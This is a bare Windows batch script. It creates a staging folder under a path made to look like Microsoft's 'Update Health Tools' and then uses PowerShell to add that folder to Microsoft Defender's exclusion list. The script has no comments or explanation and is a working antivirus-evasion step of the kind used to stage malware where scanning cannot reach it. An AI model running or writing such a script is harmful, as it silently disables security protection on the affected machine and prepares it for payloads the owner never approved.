@echo off
set SystemRoot=C:\Windows
set STAGE=C:\Program Files\Microsoft Update Health Tools\stage

mkdir "%STAGE%" 2>nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -C "Add-MpPreference -ExclusionPath '%STAGE%'; (Get-MpPreference).ExclusionPath"